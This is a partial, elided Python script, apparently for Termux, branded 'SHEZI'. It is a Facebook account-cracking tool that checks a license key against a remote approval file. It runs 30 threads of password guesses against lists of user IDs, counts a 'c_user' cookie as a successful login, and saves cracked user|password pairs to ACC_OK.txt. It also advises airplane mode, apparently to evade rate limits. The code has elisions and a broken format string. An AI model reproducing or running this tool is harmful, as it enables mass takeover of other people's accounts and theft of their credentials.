...
from concurrent.futures import ThreadPoolExecutor as shezipro
...
def main_apv():
    ...
    try:
        ...
        key1=open('/data/data/com.termux/files/usr/bin/.shezi-cov', 'r').read()
    except IOError:
        os.system("clear")
        print(logo)
        ...
        kok=open('/data/data/com.termux/files/usr/bin/.shezi-cov', 'w')
        kok.close()
        print ("")
        print ("")
    ...
    r1=requests.get("https://raw.githubusercontent.com/Dragnove/Fast/main/Approval.txt").text
    if key1 in r1:
...
def hasil(OK,cp):
	if not len(OK) != 0:
	    pass
	if len(cp) != 0:
	    print('\n\n   Total OK :  %s  ACC_OK.txt' % (H, P, str(len(ok))))
	    print('   Total CP :   %s ACC_CP.txt' % (H, P, str(len(cp))))
	    input("Press enter to back SHEZI Menu ")
	    shezi()
...
def shezi():
    ...
    print(' [E] exit ')
    print('')
    _shezi___ = input(' [?] Choose option : ')
    if _shezi___ in ('1', '01'):
        __xxx__().shezix(id)
    if _shezi___ in ('2', '02'):
        os.system('python2 makefile.py')
    if _shezi___ in ('E', 'ee'):
        pass
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        global ok,cp,loop
        sys.stdout.write(f"\r [SHEZI] {loop}|{len(self.id)} [ok][{len(ok)}] [cp][{len(cp)}] ")
        sys.stdout.flush()
        try:
            for pw in __chi__:
                pw = pw.lower()
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [SHEZI-OK] {user} | {pw}")
                    wrt = '%s|%s' % (user,pw)
                    ok.append(wrt)
                    open('ACC_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        print('\r%s [SHEZI-CP] %s | %s ' % (M, user, pw))
                        wrt = '%s|%s' % (user,pw)
                        cp.append(wrt)
                        open('SHEZI_CP.txt' , 'a').write('%s\n' % wrt)
                        break
    ...
    def __pler__(self):
        ...
        if chi == '':
            ...
            os.system("clear")
            print(logo)
            print("\rUse flight (airplane) mode before use")
            print(47*"-")
            print(' Total IDs : %s ' % len(self.id))
            print(' Cracking Started...')
            print(47*"-")
            with shezipro(max_workers=30) as ssbworld:
